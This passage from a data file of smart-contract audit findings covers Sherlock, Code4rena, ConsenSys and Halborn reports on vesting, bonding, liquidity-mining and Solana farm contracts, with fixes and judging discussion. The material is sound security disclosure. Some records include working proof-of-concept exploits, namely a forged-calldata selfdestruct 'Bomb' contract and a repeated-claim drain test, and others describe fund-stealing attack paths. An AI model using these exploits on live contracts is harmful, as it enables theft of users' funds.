This issue hinges on the same root cause that `baseTokenId` is initialized as `reservedUntilTokenId `. However, the key difference here is that `updateFounders()` is also affected, which is a completely different function. However, I still think that this should be duplicated with #42, based on [sherlock duplication rules](https://docs.sherlock.xyz/audits/judging/judging#ix.-duplication-rules), more specifically, see point 1.1 and 2. The only point where they cannot be considered duplicates is when the fixes are different. 

Unless a watson can prove to me that the fix implemented [here](https://github.com/ourzora/nouns-protocol/pull/122/commits/5f12ca4a21aaae6ca1289e5517d3545a27325366) by the sponsor is insufficient, I am inclined to keep all of them as duplicates except the above mentioned #67 and its duplicates.",Nouns Builder,0x52|rvierdiiev|bin2chen|unforgiven|saian|Ch\_301|Nyx|KingNFT|0xbepresent|chaduke|ast3ros|SovaSlava|Juntao|Krace|xAriextz|qpzm|Jiamin|circlelooper|pontifex|HHK|dimulski|0xcrunch|Kow|dany.armstrong90|KupiaSec|0xmystery|coffiasd|Aamirusmani1552|0xReiAyanami|0xpep7|zraxx|SilentDefendersOfDeFi|ge6a|ggg\_ttt\_hhh|deepkin|almurhasan|giraffe|gqrp|cawfree|Falconhoof|whoismxuse|ydlee,HIGH,,33500 USDC,0,0,0,https://github.com/sherlock-audit/2023-09-nounsbuilder-judging/issues/42,,,https://app.sherlock.xyz/audits/contests/111,solodit_reports,,2023-12-25 21:10:48,2024-10-15 00:57:27,1,uint256 baseTokenId = reservedUntilTokenId;,Liquid Staking|CDP|Services|Launchpad|Synthetics
1475038,380e1786bb6ef83432560b08bd9ab359,"H-1: Vaults can be bricked by `selfdestruct()`ing implementations, using forged immutable args",Sherlock,2024-01-13,"# Issue H-1: Vaults can be bricked by `selfdestruct()`ing implementations, using forged immutable args 

Source: https://github.com/sherlock-audit/2024-01-rio-vesting-escrow-judging/issues/60 

## Found by 
0xLogos, IllIllI, fugazzi, zzykxx
## Summary

The clone-with-immutable-args pattern is unsafe to use when one of the immutable arguments controls an address being delegated to.


## Vulnerability Detail

As was seen in the Astaria beacon proxy [issue](https://x.com/apoorvlathey/status/1671308196743647232?s=20), an attacker is able to forge the calldata that the proxy normally would forward, and can cause the implementation to `selfdestruct()` itself via a `delegatecall()`. The current code has a very similar vulnerability, in that every escrow performs a `delegatecall()` to an address coming from the factory, which is a forgeable immutable argument.


## Impact

By creating a fake `IVotingAdaptor`, and providing properly-formatted calldata to the implementation contract being passed to each factory, an attacker can gain control via the `delegatecall()` in order to `selfdestruct()` each of the factories' implementations, preventing each factory's escrows from functioning further, including the withdrawal of tokens by any party.


## Code Snippet

The `factory()` function gets its value from an immutable argument:
```solidity
// File: src/VestingEscrow.sol : VestingEscrow.factory()   #1

18        /// @notice The factory that created this VestingEscrow instance.
19        function factory() public pure returns (IVestingEscrowFactory) {
20            return IVestingEscrowFactory(_getArgAddress(0));
21:       }
```
https://github.com/sherlock-audit/2024-01-rio-vesting-escrow/blob/main/rio-vesting-escrow/src/VestingEscrow.sol#L18-L21

whose subsequent [responses](https://github.com/sherlock-audit/2024-01-rio-vesting-escrow/blob/main/rio-vesting-escrow/src/VestingEscrow.sol#L234-L236) end up being used with `delegatecall()`s:
```solidity
// File: src/VestingEscrow.sol : VestingEscrow.vote()   #2

152        /// @notice Participate in a governance vote using all available tokens on the contract's balance.
153        /// @param params The ABI-encoded data for call. Can be obtained from VotingAdaptor.encodeVoteCalldata.
154        function vote(bytes calldata params) external onlyRecipient whenVotingAdaptorIsSet returns (bytes memory) {
155            return _votingAdaptor().functionDelegateCall(abi.encodeCall(IVotingAdaptor.vote, (params)));
156:       }
```
https://github.com/sherlock-audit/2024-01-rio-vesting-escrow/blob/main/rio-vesting-escrow/src/VestingEscrow.sol#L152-L156

```solidity
// File: src/adaptors/OZVotingAdaptor.sol : OZVotingAdaptor.delegate()   #3

55        /// @notice Delegate votes.
56        /// @param params The ABI-encoded delegatee address.
57        function delegate(bytes calldata params) external {
58            IVotes(votingToken).delegate(abi.decode(params, (address)));
59:       }
```
https://github.com/sherlock-audit/2024-01-rio-vesting-escrow/blob/main/rio-vesting-escrow/src/adaptors/OZVotingAdaptor.sol#L55-L59

## Tool used

Manual Review


## Recommendation

Use a state/contract variable for anything requiring being delegated to.


## PoC

Because of a [foundry bug](https://github.com/foundry-rs/foundry/issues/1543) the test is not able to show the end result of the `selfdestruct()`, so I've added a print statement
```diff
diff --git a/rio-vesting-escrow/test/VestingEscrow.t.sol b/rio-vesting-escrow/test/VestingEscrow.t.sol
index eafb7dc..55c95a8 100644
--- a/rio-vesting-escrow/test/VestingEscrow.t.sol
+++ b/rio-vesting-escrow/test/VestingEscrow.t.sol
@@ -6,6 +6,20 @@ import {IVestingEscrow} from 'src/interfaces/IVestingEscrow.sol';
 import {OZVotingAdaptor} from 'src/adaptors/OZVotingAdaptor.sol';
 import {ERC20NoReturnToken} from 'test/lib/ERC20NoReturnToken.sol';
 import {ERC20Token} from 'test/lib/ERC20Token.sol';
+import {console} from 'forge-std/Test.sol';
+
+contract Bomb {
+    function attack(address impl) external {
+        (bool success, ) = impl.call(abi.encodePacked(bytes4(keccak256(""vote(bytes)"")), bytes32(0), address(this), address(this), address(this), uint40(block.timestamp), uint40(block.timestamp + 1), uint40(0), uint40(1), uint16(82)));
+        require(success);
+    }
+    function votingAdaptor() external view returns (address) { return address(this); } function factory() external view returns (address) { return address(this); } function recipient() external view returns (address) { return address(this); }
+    function vote(bytes calldata) external {
+        console.log(""bomb is being delegatecall()ed to; calling selfdestruct()"");
+        selfdestruct(payable(address(0)));
+    }
+}
+
 
 contract VestingEscrowTest is TestUtil {
     function setUp() public {
@@ -586,9 +600,11 @@ contract VestingEscrowTest is TestUtil {
         deployedVesting.revokeAll();
     }
 
-    function testRevokeAll() public {
+    function testRevokeAllBomb() public {
         uint256 ownerBalance = token.balanceOf(factory.owner());
 
+        new Bomb().attack(address(vestingEscrowImpl));
+
         vm.prank(factory.owner());
         deployedVesting.revokeAll();
 
diff --git a/rio-vesting-escrow/test/lib/TestUtil.sol b/rio-vesting-escrow/test/lib/TestUtil.sol
index 8667ef4..68c60ec 100644
--- a/rio-vesting-escrow/test/lib/TestUtil.sol
+++ b/rio-vesting-escrow/test/lib/TestUtil.sol
@@ -39,6 +39,7 @@ contract TestUtil is Test {
     OZVotingToken public token;
 
     VestingEscrow public deployedVesting;
+    VestingEscrow public vestingEscrowImpl;
 
     uint256 public amount;
     address public recipient;
@@ -52,8 +53,9 @@ contract TestUtil is Test {
         token = new OZVotingToken();
         governor = new GovernorVotesMock(address(token));
         ozVotingAdaptor = new OZVotingAdaptor(address(governor), address(token), config.owner);
+        vestingEscrowImpl = new VestingEscrow();
         factory = new VestingEscrowFactory(
-            address(new VestingEscrow()), address(token), config.owner, config.manager, address(ozVotingAdaptor)
+            address(vestingEscrowImpl), address(token), config.owner, config.manager, address(ozVotingAdaptor)
         );
 
         vm.deal(RANDOM_GUY, 100 ether);
```

output:
```text
% forge test --match-test testRevokeAllBomb -vvv
[⠢] Compiling...
No files changed, compilation skipped

Running 1 test for test/VestingEscrow.t.sol:VestingEscrowTest
[PASS] testRevokeAllBomb() (gas: 342335)
Logs:
  bomb is being delegatecall()ed to; calling selfdestruct()

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 9.79ms
```




## Discussion

**solimander**

Acknowledged 👍 

**sherlock-admin2**

1 comment(s) were left on this issue during the judging contest.

**pratraut** commented:
> 'invalid due to owner who is deploying escrow contract is TRUSTED entity'



**solimander**

I believe this is valid. Forging of calldata variables will allow anyone to bypass protections and `selfdestruct` the implementation contract.

**solimander**

Not sure if I'm jumping the gun here, but fixed in https://github.com/rio-org/rio-vesting-escrow/pull/6

**0xMR0**

@solimander @nevillehuang 

Isn't this issue ONLY applicable to beacon proxy or ERC1967 proxy contracts? 

The contracts are using clones(ERC-1167: Minimal Proxy Contract) and [per openzeppelin](https://docs.openzeppelin.com/contracts/4.x/api/proxy#UUPSUpgradeable-onlyProxy--),

> onlyProxy()
Check that the execution is being performed through a delegatecall call and that the execution context is a proxy contract with an implementation (as defined in ERC1967) pointing to self. This should only be the case for UUPS and transparent proxies that are using the current contract as their implementation. Execution of a function through ERC1167 minimal proxies (clones) would not normally pass this test, but is not guaranteed to fail.

code reference take from [here](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/proxy/utils/UUPSUpgradeable.sol)
```solidity

    /// @custom:oz-upgrades-unsafe-allow state-variable-immutable
    address private immutable __self = address(this);



    /**
     * @dev Check that the execution is being performed through a delegatecall call and that the execution context is
     * a proxy contract with an implementation (as defined in ERC-1967) pointing to self. This should only be the case
     * for UUPS and transparent proxies that are using the current contract as their implementation. Execution of a
     * function through ERC-1167 minimal proxies (clones) would not normally pass this test, but is not guaranteed to
     * fail.
     */
    modifier onlyProxy() {
        _checkProxy();
        _;
    }


    /**
     * @dev Reverts if the execution is not performed via delegatecall or the execution
     * context is not of a proxy with an ERC-1967 compliant implementation pointing to self.
     * See {_onlyProxy}.
     */
    function _checkProxy() internal view virtual {
        if (
            address(this) == __self || // Must be called through delegatecall
            ERC1967Utils.getImplementation() != __self // Must be called through an active proxy
        ) {
            revert UUPSUnauthorizedCallContext();
        }
    }
```

similar modifier has been used by project team [here](https://github.com/rio-org/rio-vesting-escrow/pull/6/commits/9932073d6c0b4bfcc72961b647dd66a72b931ea5#diff-bad9934dc79f93bce7e10124cce6096927b8207510a9eff058f3217f10832803R19) as seen in pull request.


Can you please check the issue is really with minimal proxies? if its possible, Not sure why the user i.e recipient will do this to stuck his own tokens since the functions are onlyRecipient protected? If it can be done by malicious owner then owner is trusted here? Or am i missing something or the context of above openzeppelin reference is misunderstood?

Thanks and appreciate the response.

**detectiveking123**

I believe this is a valid issue as well. It is a good catch. 

**solimander**

> Can you please check the issue is really with minimal proxies? if its possible, Not sure why the user i.e recipient will do this to stuck his own tokens since the functions are onlyRecipient protected? If it can be done by malicious owner then owner is trusted here? Or am i missing something or the context of above openzeppelin reference is misunderstood?

You're misunderstanding somewhat. The problem is related to the fact that the ""immutable"" variables are actually calldata, and can therefore be forged when when calling the implementation contract directly. First, the attacker needs to bypass `onlyRecipient`, which they can do by setting the recipient (`_getArgAddress(40)`) to their address in the calldata. Then they call one of the three functions that delegate-calls `_votingAdaptor` (`delegate`, `vote`, or `voteWithReason`). `_votingAdaptor` can be faked via a forged `factory`. The fake `_votingAdaptor` then calls self-destruct and there goes the implementation contract. All escrows are bricked.

**IllIllI000**

The [PR](https://github.com/rio-org/rio-vesting-escrow/pull/6) properly mitigates the issue by creating and using a new `onlyDelegateCall` modifier (similar to OZ's [version](https://github.com/OpenZeppelin/openzeppelin-upgrades/blob/2cf601497f7ff5bb9554d056e0b17725dbe64e7e/docs/modules/ROOT/pages/faq.adoc#can-i-safely-use-delegatecall-and-selfdestruct)) on the external `vote()` and `voteWithReason()` functions, as well as on the internal `_delegate()` function, which are the only functions making `delegatecall()`s from implementations, on results controlled by a `_getArgAddress()` internal function call. The new modifier is added to a new mixin which adds a new `immutable` `address` contract variable and sets it to the contract's own address during construction. The mixin is added to the vulnerable `VestingEscrow` contract's inheritance chain, and properly rejects any call coming from the contract by checking `address(this)` against the stored address, which correctly won't match for `delegatecall`s. The PR also adds the `delegate()`, `vote()`, and `voteWithReason()` functions from `VestingEscrow.sol` to `IVestingEscrow.sol`, and adds passing negative tests for the attack on each of those functions on the factory's implementation. There is no test for an attack on `initialize()`. The PR also updates the gas snapshot numbers. The clone itself (proxy) is not vulnerable, because it forwards all requests via `delegatecall()`, rather than relying on any of the implementation's code.

**solimander**

Thanks @IllIllI000! I've added a test for an attack on initialize: https://github.com/rio-org/rio-vesting-escrow/pull/6/commits/a6544b174aff9b2ff766f7aece03b052ec2b7466",Rio Vesting Escrow,IllIllI|zzykxx|0xLogos|fugazzi,HIGH,,10500 USDC,0,0,0,https://github.com/sherlock-audit/2024-01-rio-vesting-escrow-judging/issues/60,,,https://app.sherlock.xyz/audits/contests/159,solodit_reports,,2024-01-25 21:10:24,2024-10-15 01:03:54,1,"function _votingAdaptor() internal view returns (address) {
        return factory().votingAdaptor();
    }",
1475165,1595d8530b54d3830932e4ae2b6e16d8,[H-04] Bonds created in year cross epoch's can lead to lost payouts,Code4rena,2023-12-21,"<https://github.com/code-423n4/2023-12-autonolas/blob/2a095eb1f8359be349d23af67089795fb0be4ed1/tokenomics/contracts/Tokenomics.sol#L1037-L1038> <br><https://github.com/code-423n4/2023-12-autonolas/blob/2a095eb1f8359be349d23af67089795fb0be4ed1/governance/contracts/OLAS.sol#L75-L84>

Bond depositors and agent/component owner's may never receive the payout Olas.
Incorrect inflation control.

### Proof of Concept

`effectiveBond` is used to account how much of Olas is available for bonding. This includes Olas that are to be minted in the current epoch ie. `effectiveBond` will include the Olas partitioned for bonding in epoch 5 at the beginning of epoch 5 itself. In case of epoch's crossing `YEAR` intervals, a portion of the Olas would actually only be mintable in the next year due to the yearwise inflation control enforced at the mint (after 9 years due to fixed supply till 10 years). Due to silent reverts, this can lead to lost Olas payouts

The inflation for bonds are accounted using the `effectiveBond` variable. <br><https://github.com/code-423n4/2023-12-autonolas/blob/2a095eb1f8359be349d23af67089795fb0be4ed1/tokenomics/contracts/Tokenomics.sol#L609-L617>

```solidity
    function reserveAmountForBondProgram(uint256 amount) external returns (bool success) {
       
       .....

        // Effective bond must be bigger than the requested amount
        uint256 eBond = effectiveBond;
        if (eBond >= amount) {

            eBond -= amount;
            effectiveBond = uint96(eBond);
            success = true;
            emit EffectiveBondUpdated(eBond);
        }
    }
```

This variable is updated with the estimated bond Olas at the beginning of an epoch itself.

<https://github.com/code-423n4/2023-12-autonolas/blob/2a095eb1f8359be349d23af67089795fb0be4ed1/tokenomics/contracts/Tokenomics.sol#L1037-L1038>

```solidity
    function checkpoint() external returns (bool) {
        
        .....

        // Update effectiveBond with the current or updated maxBond value
        curMaxBond += effectiveBond;
        effectiveBond = uint96(curMaxBond);
```

In case of epochs crossing `YEAR` intervals after 9 years, the new Olas amount will not be fully mintable in the same year due to the inflation control check enforced in the Olas contract.

<https://github.com/code-423n4/2023-12-autonolas/blob/2a095eb1f8359be349d23af67089795fb0be4ed1/governance/contracts/OLAS.sol#L75-L84>

```solidity
    function mint(address account, uint256 amount) external {

        ....
        
        // Check the inflation schedule and mint
        if (inflationControl(amount)) {
            _mint(account, amount);
        }
```

Whenever a deposit is made on a bond, the required Olas is minted by the treasury and transferred to the Depository contract, from where the depositor claims the payout after the vesting time. `Olas.sol` doesn't revert for inflation check failure but fails silently. This can cause a deposit to succeed but corresponding redeem to fail since payout Olas has not been actually minted.
It can also happen that agent/component owner's who have not claimed the topup Olas amount will loose their reward due to silent return when minting their reward.

### Example

*   Year 10, 1 month left for Year 11.
*   All Olas associated with previous epochs have been minted.
*   New epoch of 2 months is started, 1 month in Year 10 and 1 month in Year 11.
*   Total Olas for the epoch, t = year 10 1 month inflation + year 11 1 month inflation.

Year 10 1 month inflaiton (y10m1) = (1\_000\_000\_000e18 \* 2 / 100 / 12)<br>
Year 11 1 month inflation (y11m1) = (1\_020\_000\_000e18 \* 2 / 100 / 12)
t = y10m1 + y11m1

*   Olas bond percentage = 50%
*   Hence effectiveBond = t/2
*   But actual mintable remaining in year 0, m = y10m1 < effectiveBond
*   A bond is created with supply == effectiveBond
*   User's deposit for the entire bond supply but only y10m1 Olas can be minted. Depending on the nature of deposits, the actual amount minted can vary from 0 to y10m1. In case of unminted amounts(as rewards of agent/component owner's etc.) at Year 10, this amount can be minted for bond deposits following which if agent/component owners claim within the year, no Olas will be received by them.
*   Users lose their Olas payout.

### POC Test

<https://gist.github.com/10xhash/2157c1f2cdc9513b3f0a7f359a65015e>

### Recommended Mitigation Steps

In case of multi-year epochs, separate bond amounts of next year.

**[kupermind (Olas) confirmed](https://github.com/code-423n4/2023-12-autonolas-findings/issues/373#issuecomment-1893958287)**

***",Olas,0xTheC0der|HChang26|hash|c0pp3rscr3w3r,HIGH,,90500,0,0,0,https://github.com/code-423n4/2023-12-autonolas-findings/issues/373,https://code4rena.com/reports/2023-12-autonolas,,https://code4rena.com/reports/2023-12-autonolas,solodit_reports,93c9bbb78af223459c892e4c04c210df,2024-02-08 21:10:27,2024-10-15 01:00:52,1,"curMaxBond += effectiveBond;
        effectiveBond = uint96(curMaxBond);
```
    function mint(address account, uint256 amount) external {
        // Access control
        if (msg.sender != minter) {
            revert ManagerOnly(msg.sender, minter);
        }

        // Check the inflation schedule and mint
        if (inflationControl(amount)) {
            _mint(account, amount);
        }
```
    function reserveAmountForBondProgram(uint256 amount) external returns (bool success) {
        // Check for the depository access
        if (depository != msg.sender) {
            revert ManagerOnly(msg.sender, depository);
        }

        // Effective bond must be bigger than the requested amount
        uint256 eBond = effectiveBond;
        if (eBond >= amount) {",
1505027,70bc30d62693789041616d9c8611ecda,"H-2: `cancelVesting` will potentially not give users unclaimed, vested funds, even if giveUnclaimed = true",Sherlock,2024-01-08,"# Issue H-2: `cancelVesting` will potentially not give users unclaimed, vested funds, even if giveUnclaimed = true 

Source: https://github.com/sherlock-audit/2023-12-truflation-judging/issues/192 

## Found by 
s1ce, zraxx, zzykxx
## Summary

The purpose of `cancelVesting` is to cancel a vesting grant and potentially give users unclaimed but vested funds in the event that `giveUnclaimed = true`. However, due to a bug, in the event that the user had staked / locked funds, they will potentially not received the unclaimed / vested funds even if `giveUnclaimed = true`. 

## Vulnerability Detail

Here's the cancelVesting function in TrufVesting:

```solidity
function cancelVesting(uint256 categoryId, uint256 vestingId, address user, bool giveUnclaimed)
        external
        onlyOwner
{
        UserVesting memory userVesting = userVestings[categoryId][vestingId][user];

        if (userVesting.amount == 0) {
            revert UserVestingDoesNotExists(categoryId, vestingId, user);
        }

        if (userVesting.startTime + vestingInfos[categoryId][vestingId].period <= block.timestamp) {
            revert AlreadyVested(categoryId, vestingId, user);
        }

        uint256 lockupId = lockupIds[categoryId][vestingId][user];

        if (lockupId != 0) {
            veTRUF.unstakeVesting(user, lockupId - 1, true);
            delete lockupIds[categoryId][vestingId][user];
            userVesting.locked = 0;
        }

        VestingCategory storage category = categories[categoryId];

        uint256 claimableAmount = claimable(categoryId, vestingId, user);
        if (giveUnclaimed && claimableAmount != 0) {
            trufToken.safeTransfer(user, claimableAmount);

            userVesting.claimed += claimableAmount;
            category.totalClaimed += claimableAmount;
            emit Claimed(categoryId, vestingId, user, claimableAmount);
        }

        uint256 unvested = userVesting.amount - userVesting.claimed;

        delete userVestings[categoryId][vestingId][user];

        category.allocated -= unvested;

        emit CancelVesting(categoryId, vestingId, user, giveUnclaimed);
}
```

First, consider the following code:

```solidity
uint256 lockupId = lockupIds[categoryId][vestingId][user];

if (lockupId != 0) {
            veTRUF.unstakeVesting(user, lockupId - 1, true);
            delete lockupIds[categoryId][vestingId][user];
            userVesting.locked = 0;
}
```

First the locked / staked funds will essentially be un-staked. The following line of code: `userVesting.locked = 0;` exists because there is a call to `uint256 claimableAmount = claimable(categoryId, vestingId, user);` afterwards, and in the event that there were locked funds that were unstaked, these funds should now potentially be claimable if they are vested (but if locked is not set to 0, then the vested funds will potentially not be deemed claimable by the `claimable` function). 

However, because `userVesting` is `memory` rather than `storage`, this doesn't end up happening (so `userVesting.locked = 0;` is actually a bug). This means that if a user is currently staking all their funds (so all their funds are locked), and `cancelVesting` is called, then they will not receive any funds back even if `giveUnclaimed = true`. This is because the `claimable` function (which will access the unaltered `userVestings[categoryId][vestingId][user]`) will still think that all the funds are currently locked, even though they are not as they have been forcibly unstaked. 

## Impact

When `cancelVesting` is called, a user may not receive their unclaimed, vested funds. 

## Code Snippet

https://github.com/sherlock-audit/2023-12-truflation/blob/main/truflation-contracts/src/token/TrufVesting.sol#L348-L388

## Tool used

Manual Review

## Recommendation
Change `userVesting.locked = 0;` to `userVestings[categoryId][vestingId][user].locked = 0;`



## Discussion

**ryuheimat**

Fixed.
Updated `userVesting` type to storage type to fix https://github.com/sherlock-audit/2023-12-truflation-judging/issues/192
Considered initial release period and cliff for vesting end validation to fix https://github.com/sherlock-audit/2023-12-truflation-judging/issues/11

Extra:
Added `admin` permission, and allow several admins to be able to set vesting info and user vestings.
https://github.com/truflation/truflation-contracts/pull/4

**mstpr**

Fix and new admin functionality LGTM

**ryuheimat**

> Fix and new admin functionality LGTM

Thank you, merging PR.",Truflation,zzykxx|zraxx|s1ce,HIGH,,9500 USDC,0,0,0,https://github.com/sherlock-audit/2023-12-truflation-judging/issues/192,,,https://app.sherlock.xyz/audits/contests/151,solodit_reports,,2024-01-29 21:10:49,2024-10-15 01:01:30,1,,
1535009,a6e33ebf161bd1c9336b1b6e7f3c5d70,H-1: Users can fully drain the `TrufVesting` contract,Sherlock,2024-01-08,"# Issue H-1: Users can fully drain the `TrufVesting` contract 

Source: https://github.com/sherlock-audit/2023-12-truflation-judging/issues/1 

## Found by 
0xLogos, CL001, HonorLt, IvanFitro, KupiaSec, asauditor, bughuntoor, carrotsmuggler, cawfree, fnanni, mstpr-brainbot, s1ce, ubl4nk, unforgiven, ydlee, zzykxx
## Summary
Due to flaw in the logic in `claimable` any arbitrary user can drain all the funds within the contract.

## Vulnerability Detail
A user's claimable is calculated in the following way: 
1. Up until start time it is 0.
2. Between start time and cliff time it's equal to `initialRelease`.
3. After cliff time, it linearly increases until the full period ends.

However, if we look at the code, when we are at stage 2., it always returns `initialRelease`, even if we've already claimed it. This would allow for any arbitrary user to call claim as many times as they wish and every time they'd receive `initialRelease`. Given enough iterations, any user can drain the contract. 

```solidity
    function claimable(uint256 categoryId, uint256 vestingId, address user)
        public
        view
        returns (uint256 claimableAmount)
    {
        UserVesting memory userVesting = userVestings[categoryId][vestingId][user];

        VestingInfo memory info = vestingInfos[categoryId][vestingId];

        uint64 startTime = userVesting.startTime + info.initialReleasePeriod;

        if (startTime > block.timestamp) {
            return 0;
        }

        uint256 totalAmount = userVesting.amount;

        uint256 initialRelease = (totalAmount * info.initialReleasePct) / DENOMINATOR;

        startTime += info.cliff;

        if (startTime > block.timestamp) {
            return initialRelease;
        }
```

```solidity
    function claim(address user, uint256 categoryId, uint256 vestingId, uint256 claimAmount) public {
        if (user != msg.sender && (!categories[categoryId].adminClaimable || msg.sender != owner())) {
            revert Forbidden(msg.sender);
        }

        uint256 claimableAmount = claimable(categoryId, vestingId, user);
        if (claimAmount == type(uint256).max) {
            claimAmount = claimableAmount;
        } else if (claimAmount > claimableAmount) {
            revert ClaimAmountExceed();
        }
        if (claimAmount == 0) {
            revert ZeroAmount();
        }

        categories[categoryId].totalClaimed += claimAmount;
        userVestings[categoryId][vestingId][user].claimed += claimAmount;
        trufToken.safeTransfer(user, claimAmount);

        emit Claimed(categoryId, vestingId, user, claimAmount);
    }
```


## Impact
Any user can drain the contract 

## Code Snippet
https://github.com/sherlock-audit/2023-12-truflation/blob/main/truflation-contracts/src/token/TrufVesting.sol#L176C1-L182C10

## Tool used

Manual Review

## Recommendation
change the if check to the following 
```solidity
        if (startTime > block.timestamp) {
            if (initialRelease > userVesting.claimed) {
            return initialRelease - userVesting.claimed;
            }
            else { return 0; } 
        }
```

## PoC 

```solidity
    function test_cliffVestingDrain() public { 
        _setupVestingPlan();
        uint256 categoryId = 2;
        uint256 vestingId = 0;
        uint256 stakeAmount = 10e18;
        uint256 duration = 30 days;

        vm.startPrank(owner);
        
        vesting.setUserVesting(categoryId, vestingId, alice, 0, stakeAmount);

        vm.warp(block.timestamp + 11 days);     // warping 11 days, because initial release period is 10 days
                                                // and cliff is at 20 days. We need to be in the middle 
        vm.startPrank(alice);
        assertEq(trufToken.balanceOf(alice), 0);
        vesting.claim(alice, categoryId, vestingId, type(uint256).max);
        
        uint256 balance = trufToken.balanceOf(alice);
        assertEq(balance, stakeAmount * 5 / 100);  // Alice should be able to have claimed just 5% of the vesting 

        for (uint i; i < 39; i++ ){ 
            vesting.claim(alice, categoryId, vestingId, type(uint256).max);
        }
        uint256 newBalance = trufToken.balanceOf(alice);   // Alice has claimed 2x the amount she was supposed to be vested. 
        assertEq(newBalance, stakeAmount * 2);             // In fact she can keep on doing this to drain the whole contract
    }
```




## Discussion

**sherlock-admin2**

1 comment(s) were left on this issue during the judging contest.

**Shaheen** commented:
>  Valid High. Solid Catch



**ryuheimat**

https://github.com/truflation/truflation-contracts/pull/3

Fixed `claimable` function

**mstpr**

Fix LGTM

**ryuheimat**

Merged",Truflation,unforgiven|HonorLt|zzykxx|carrotsmuggler|mstpr-brainbot|ubl4nk|KupiaSec|IvanFitro|CL001|cawfree|ydlee|bughuntoor|0xLogos|s1ce|asauditor|fnanni,HIGH,,9500 USDC,0,0,0,https://github.com/sherlock-audit/2023-12-truflation-judging/issues/1,,,https://app.sherlock.xyz/audits/contests/151,solodit_reports,,2024-01-29 21:10:49,2024-10-15 01:01:30,1,,
728639,0271df4c4ec8997d5f22f809d8311023,Anyone can win all the funds from the LiquidityMining without investing any DAI,ConsenSys,2021-03-01,"#### Description


When a user decides to `investDAI` in the `LiquidityMining` contract, the policy book address is passed as a parameter:


**code\_new/contracts/LiquidityMining.sol:L198**



```
function investDAI(uint256 \_tokensAmount, address \_policyBookAddr) external override {

```
But this parameter is never checked and only used at the end of the function:


**code\_new/contracts/LiquidityMining.sol:L223**



```
IPolicyBook(\_policyBookAddr).addLiquidityFromLM(msg.sender, \_tokensAmount);

```
The attacker can pass the address of a simple multisig that will process this transaction successfully without doing anything. And pretend to invest a lot of DAI without actually doing that to win all the rewards in the `LiquidityMining` contract.


#### Recommendation


Check that the pool address is valid.",Bridge Mutual,Sergii Kravchenko|Daniel Luca,HIGH,,,0,0,0,,https://consensys.net/diligence/audits/2021/03/bridge-mutual/,,,solodit_reports,,2023-09-22 02:37:57,2024-10-14 21:44:39,1,,Liquid Staking|CDP|Services|Cross Chain|Insurance
729381,f06208dea2ee595cf2783dedaae1b866,MISSING ACCOUNT VALIDATION LEADS TO MULTIPLE CRITICAL VULNERABILITIES,Halborn,2021-10-05,"Description: The Cropper Farm program allows users to deposit LP tokens in farms and harvest rewards based on the deposit they made. Each farm is owned by an authority account which controls the farm’s LP token pool and the reward token pool. This authority is a PDA derived from the farm account address and the farm program ID. Whenever a user sends a transaction to the program they have to provide a number of account addresses, the most interesting of them being: 1.source token account address 2.destination token account address 3.transfer authority account address 4.fee account address All token transfers are handled by the token_transfer function defined inprocessor .rs. token_transfer signs all transactions with the farms authority account (the PDA) by default and uses the invoke_signed function to call the SPL Token program’s process_transfer function to transfer the tokens. The invoke_signed function appends the program’s signature to the transaction signers array. Because neither deposit nor withdraw functions validate addresses and ownership of the user-supplied accounts, a number of critical vulnera- bilities can be identified in the program, including: 13 FINDINGS & TECH DETAILS 1.Stealing all LP tokens in all pools A malicious user may send a Deposit ,Withdraw or an AddReward instruction and replace his transfer authority account address with the farm authority account address, the source LP token account with the farm’s LP token account and the destination LP token account with their own account to transfer all tokens from the farm pool account to the user’s account. This is because the source token address is not validated not to be equal to the farm pool’s account address 2.Stealing handling fees A malicious user may send a PayFarmFee ,Deposit orWithdraw instruction and replace the fee account address with their own account address to transfer the fee back to themselves. The program will confirm the fee has been paid successully and will keep processing the instruction logic. This is because the user-supplied fee account address is not validated to match the intended one. Code Location: Listing 1: processor.rs (Lines 782,787,788,793,800)776 ///issue aspl_token `Transfer `instruction . 777 pub fntoken_transfer <'a>( 778 pool : &Pubkey , 779 token_program :AccountInfo <'a>, 780 source :AccountInfo <'a>, 781 destination :AccountInfo <'a>, 782 authority :AccountInfo <'a>, 783 nonce :u8, 784 amount :u64, 785 ) -> Result <() , ProgramError > { 786 let pool_bytes =pool .to_bytes (); 787 let authority_signature_seeds = [& pool_bytes [..32] , &[ nonce ]]; 788 let signers = &[& authority_signature_seeds [..]]; 789 let ix=spl_token ::instruction ::transfer ( 14 FINDINGS & TECH DETAILS 790 token_program .key, 791 source .key, 792 destination .key, 793 authority .key, 794 &[] , 795 amount , 796 )?; 797 invoke_signed ( 798 &ix, 799 &[source ,destination ,authority ,token_program ], 800 signers , 801 ) 802 } 15 FINDINGS & TECH DETAILS Examples of missing account validation in process .rs. Listing 2: process.rs256 //authority information ofthis farm account 257 let authority_info =next_account_info (account_info_iter )?; 258 259 //depositor 'swallet account information 260 let depositor_info =next_account_info (account_info_iter )?; 261 262 //depositor 'suser account information toinclude deposited balance ,reward debt 263 let user_info_account_info =next_account_info (account_info_iter ) ?; 264 265 //depositor 'stransfer authority (wallet address ) 266 let user_transfer_authority_info =next_account_info ( account_info_iter )?; 267 268 //lptoken account information inthe depositor 'swallet 269 let user_lp_token_account_info =next_account_info ( account_info_iter )?; 270 271 //lptoken account information inthe farm pool 272 let pool_lp_token_account_info =next_account_info ( account_info_iter )?; 273 274 //reward token account information inthe depositor 'swallet 275 let user_reward_token_account_info =next_account_info ( account_info_iter )?; 276 277 //reward token account information inthe farm pool 278 let pool_reward_token_account_info =next_account_info ( account_info_iter )?; 16 FINDINGS & TECH DETAILS Harvesting rewards, paying the fee and depositing tokens. Listing 3: processor.rs (Lines 350,364,378,379,380)335 //harvest user 'spending rewards 336 ifuser_info .deposit_balance > 0 { 337 338 //pending amount 339 let pending :u64 =farm_pool .pending_rewards (&mut user_info ); 340 341 ifpending > 0 { 342 //harvest fee for the pending reward 343 let harvest_fee =pending *HARVEST_FEE_NUMERATOR / HARVEST_FEE_DENOMINATOR ; 344 345 //transfer harvest fee tofee owner 346 Self ::token_transfer ( 347 farm_id_info .key, 348 token_program_info .clone () , 349 pool_reward_token_account_info .clone () , 350 fee_owner_info .clone () , 351 authority_info .clone () , 352 farm_pool .nonce , 353 harvest_fee 354 )?; 355 356 //user 'sreal pending amount 357 let _pending =pending -harvest_fee ; 358 359 //transfer pending reward amount from reward pool touser reward token account 360 Self ::token_transfer ( 361 farm_id_info .key, 362 token_program_info .clone () , 363 pool_reward_token_account_info 